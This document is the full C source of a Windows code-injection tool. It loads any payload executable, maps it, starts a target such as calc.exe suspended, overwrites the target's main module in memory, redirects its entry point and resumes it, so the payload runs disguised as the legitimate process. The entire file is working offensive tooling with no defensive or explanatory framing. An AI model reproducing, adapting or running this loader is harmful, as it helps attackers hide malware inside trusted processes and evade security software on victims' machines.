#include <windows.h>
#include <stdio.h>

// ====================================================================
// PE PARSING HELPERS (REPLACING PECONV)
// ====================================================================

// Gets the NT Headers from a raw PE buffer.
IMAGE_NT_HEADERS* get_nt_headers(BYTE* buffer)
{
    if (!buffer) return NULL;
    IMAGE_DOS_HEADER* dos_header = (IMAGE_DOS_HEADER*)buffer;
    if (dos_header->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[-] Invalid DOS signature.\n");
        return NULL;
    }
    return (IMAGE_NT_HEADERS*)(buffer + dos_header->e_lfanew);
}

// Checks if the PE buffer is for a 64-bit executable.
BOOL is_64bit(BYTE* buffer)
{
    IMAGE_NT_HEADERS* nt_headers = get_nt_headers(buffer);
    if (!nt_headers) return FALSE;
    return (nt_headers->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC);
}

// Gets the SizeOfImage from the PE headers.
DWORD get_image_size(BYTE* buffer)
{
    IMAGE_NT_HEADERS* nt_headers = get_nt_headers(buffer);
    if (!nt_headers) return 0;
    return nt_headers->OptionalHeader.SizeOfImage;
}

// Gets the RVA of the Entry Point.
DWORD get_entry_point_rva(BYTE* buffer)
{
    IMAGE_NT_HEADERS* nt_headers = get_nt_headers(buffer);
    if (!nt_headers) return 0;
    return nt_headers->OptionalHeader.AddressOfEntryPoint;
}

// Maps a raw PE file buffer into a virtual layout, similar to how the OS loader would map it.
BYTE* pe_buffer_to_virtual_image(BYTE* raw_buffer, DWORD* out_size)
{
    IMAGE_NT_HEADERS* nt_headers = get_nt_headers(raw_buffer);
    if (!nt_headers) return NULL;

    DWORD image_size = nt_headers->OptionalHeader.SizeOfImage;
    BYTE* virtual_image = (BYTE*)VirtualAlloc(NULL, image_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!virtual_image) {
        printf("[-] VirtualAlloc failed: %lu\n", GetLastError());
        return NULL;
    }

    // Copy headers
    memcpy(virtual_image, raw_buffer, nt_headers->OptionalHeader.SizeOfHeaders);

    // Copy sections
    IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(nt_headers);
    for (WORD i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
        if (sections[i].PointerToRawData && sections[i].SizeOfRawData > 0) {
            memcpy(virtual_image + sections[i].VirtualAddress, raw_buffer + sections[i].PointerToRawData, sections[i].SizeOfRawData);
        }
    }
    *out_size = image_size;
    return virtual_image;
}

// ====================================================================
// PROCESS MANIPULATION
// ====================================================================

// Creates a process in a suspended state.
BOOL create_suspended_process(char* path, PROCESS_INFORMATION* pi)
{
    STARTUPINFOA si = { 0 };
    si.cb = sizeof(STARTUPINFOA);
    memset(pi, 0, sizeof(PROCESS_INFORMATION));

    if (!CreateProcessA(path, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, pi)) {
        printf("[-] CreateProcess failed: %lu\n", GetLastError());
        return FALSE;
    }
    return TRUE;
}

// Updates the Entry Point of the remote process's main thread.
BOOL update_remote_entry_point(PROCESS_INFORMATION* pi, ULONGLONG entry_point_va, BOOL is_32bit_target)
{
#ifdef _WIN64
    if (is_32bit_target) {
        WOW64_CONTEXT context = { 0 };
        context.ContextFlags = CONTEXT_INTEGER;
        if (!Wow64GetThreadContext(pi->hThread, &context)) return FALSE;
        context.Eax = (DWORD)entry_point_va;
        return Wow64SetThreadContext(pi->hThread, &context);
    }
#endif
    CONTEXT context = { 0 };
    context.ContextFlags = CONTEXT_INTEGER;
    if (!GetThreadContext(pi->hThread, &context)) return FALSE;
#ifdef _WIN64
    context.Rcx = entry_point_va;
#else
    context.Eax = (DWORD)entry_point_va;
#endif
    return SetThreadContext(pi->hThread, &context);
}

// Gets the base address of the main module in the remote process.
ULONGLONG get_remote_image_base(PROCESS_INFORMATION* pi, BOOL is_32bit_target)
{
    ULONGLONG peb_offset = is_32bit_target ? 0x8 : 0x10;
    ULONGLONG peb_addr = 0;
    ULONGLONG image_base = 0;
    SIZE_T read = 0;

#ifdef _WIN64
    if (is_32bit_target) {
        WOW64_CONTEXT context = { 0 };
        context.ContextFlags = CONTEXT_INTEGER;
        if (!Wow64GetThreadContext(pi->hThread, &context)) return 0;
        peb_addr = context.Ebx;
    } else {
#endif
        CONTEXT context = { 0 };
        context.ContextFlags = CONTEXT_INTEGER;
        if (!GetThreadContext(pi->hThread, &context)) return 0;
#ifdef _WIN64
        peb_addr = context.Rdx;
#else
        peb_addr = context.Ebx;
#endif
#ifdef _WIN64
    }
#endif

    if (!ReadProcessMemory(pi->hProcess, (LPCVOID)(peb_addr + peb_offset), &image_base, sizeof(ULONGLONG), &read)) {
        return 0;
    }
    return image_base;
}

// ====================================================================
// MEMORY OVERWRITING
// ====================================================================

// Overwrites the remote process's main module with the payload.
BOOL overwrite_and_run(PROCESS_INFORMATION* pi, BYTE* payload_image, DWORD payload_image_size)
{
    BOOL is_payload_32bit = !is_64bit(payload_image);
    ULONGLONG remote_base = get_remote_image_base(pi, is_payload_32bit);
    if (!remote_base) {
        printf("[-] Failed to get remote image base.\n");
        return FALSE;
    }
    printf("[+] Remote image base: 0x%llX\n", remote_base);

    DWORD old_protect = 0;
    if (!VirtualProtectEx(pi->hProcess, (LPVOID)remote_base, payload_image_size, PAGE_EXECUTE_READWRITE, &old_protect)) {
        printf("[-] VirtualProtectEx failed: %lu\n", GetLastError());
        return FALSE;
    }

    SIZE_T written = 0;
    if (!WriteProcessMemory(pi->hProcess, (LPVOID)remote_base, payload_image, payload_image_size, &written) || written != payload_image_size) {
        printf("[-] WriteProcessMemory failed: %lu\n", GetLastError());
        return FALSE;
    }
    printf("[+] Payload written to remote process.\n");

    ULONGLONG entry_point_va = remote_base + get_entry_point_rva(payload_image);
    if (!update_remote_entry_point(pi, entry_point_va, is_payload_32bit)) {
        printf("[-] Failed to update remote entry point.\n");
        return FALSE;
    }
    printf("[+] Remote entry point updated.\n");

    ResumeThread(pi->hThread);
    printf("[+] Process resumed. PID: %lu\n", pi->dwProcessId);
    return TRUE;
}

// ====================================================================
// MAIN
// ====================================================================

int main(int argc, char* argv[])
{
    if (argc < 2) {
        printf("Usage: %s <payload.exe> [target.exe]\n", argv[0]);
        return 1;
    }

    char* payload_path = argv[1];
    char* target_path = (argc > 2) ? argv[2] : "C:\\Windows\\System32\\calc.exe";

    printf("[+] Payload: %s\n", payload_path);
    printf("[+] Target:  %s\n", target_path);

    HANDLE h_file = CreateFileA(payload_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (h_file == INVALID_HANDLE_VALUE) {
        printf("[-] Could not open payload file: %s\n", payload_path);
        return 1;
    }

    DWORD raw_size = GetFileSize(h_file, NULL);
    BYTE* raw_buffer = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, raw_size);
    DWORD read = 0;
    ReadFile(h_file, raw_buffer, raw_size, &read, NULL);
    CloseHandle(h_file);

    if (read != raw_size) {
        printf("[-] Failed to read payload file.\n");
        HeapFree(GetProcessHeap(), 0, raw_buffer);
        return 1;
    }

    DWORD payload_image_size = 0;
    BYTE* payload_image = pe_buffer_to_virtual_image(raw_buffer, &payload_image_size);
    HeapFree(GetProcessHeap(), 0, raw_buffer);

    if (!payload_image) {
        printf("[-] Failed to map payload to virtual image.\n");
        return 1;
    }
    printf("[+] Payload mapped to virtual image of size: %lu bytes\n", payload_image_size);

    // --- Load target and perform compatibility checks ---
    HANDLE h_target_file = CreateFileA(target_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (h_target_file == INVALID_HANDLE_VALUE) {
        printf("[-] Could not open target file: %s\n", target_path);
        VirtualFree(payload_image, 0, MEM_RELEASE);
        return 1;
    }
    DWORD target_raw_size = GetFileSize(h_target_file, NULL);
    BYTE* target_raw_buffer = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, target_raw_size);
    DWORD target_read = 0;
    ReadFile(h_target_file, target_raw_buffer, target_raw_size, &target_read, NULL);
    CloseHandle(h_target_file);

    if (target_read != target_raw_size) {
        printf("[-] Failed to read target file.\n");
        HeapFree(GetProcessHeap(), 0, target_raw_buffer);
        VirtualFree(payload_image, 0, MEM_RELEASE);
        return 1;
    }

    BOOL is_payload_32bit = !is_64bit(payload_image);
    BOOL is_target_32bit = !is_64bit(target_raw_buffer);
    DWORD target_image_size = get_image_size(target_raw_buffer);
    HeapFree(GetProcessHeap(), 0, target_raw_buffer);

    if (is_payload_32bit != is_target_32bit) {
        printf("[-] ERROR: Payload and Target have different architectures (32/64 bit).\n");
        printf("[-] Payload is %s, Target is %s.\n", is_payload_32bit ? "32-bit" : "64-bit", is_target_32bit ? "32-bit" : "64-bit");
        VirtualFree(payload_image, 0, MEM_RELEASE);
        return 1;
    }
    printf("[+] Payload and Target architecture match (%s).\n", is_payload_32bit ? "32-bit" : "64-bit");

    if (payload_image_size > target_image_size) {
        printf("[-] ERROR: Payload image size (%lu) is larger than target image size (%lu).\n", payload_image_size, target_image_size);
        VirtualFree(payload_image, 0, MEM_RELEASE);
        return 1;
    }
    printf("[+] Payload size (%lu) is compatible with target size (%lu).\n", payload_image_size, target_image_size);
    // --- End of checks ---

    PROCESS_INFORMATION pi;
    if (!create_suspended_process(target_path, &pi)) {
        VirtualFree(payload_image, 0, MEM_RELEASE);
        return 1;
    }
    printf("[+] Created suspended target process. PID: %lu\n", pi.dwProcessId);

    if (!overwrite_and_run(&pi, payload_image, payload_image_size)) {
        printf("[-] Failed to perform process overwriting.\n");
        TerminateProcess(pi.hProcess, 1);
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    VirtualFree(payload_image, 0, MEM_RELEASE);

    printf("[+] Done.\n");
    return 0;
}
